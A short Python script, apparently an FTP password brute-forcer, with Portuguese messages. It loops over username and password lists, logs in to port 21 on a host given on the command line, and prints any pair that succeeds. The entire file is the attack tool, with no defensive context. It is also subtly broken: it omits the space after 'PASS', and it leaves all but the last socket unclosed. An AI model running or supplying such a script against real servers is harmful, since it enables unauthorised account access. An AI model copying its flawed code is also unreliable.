import re
import socket
import sys


with open("users.txt","r") as f:
    list_users = [line.strip() for line in f.readlines()]

with open("pass.txt","r") as f:
    list_pass = [line.strip() for line in f.readlines()]

for users in list_users:
    for passwd in list_pass:
       


        conec = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        conec.connect((sys.argv[1],21))
        dados = conec.recv(1024)

        
        enviando_user = conec.send(b"USER " + users.encode() + b"\r\n")
        resposta = conec.recv(1024)

        enviando_pass = conec.send(b"PASS" + passwd.encode() + b"\r\n")

        resposta = conec.recv(1024)

        if re.search("230",resposta.decode()):
            print("Login correto")
            print("Usuario: " + users)
            print(" senha: " + passwd)

            
        else:
            pass
 
conec.close()

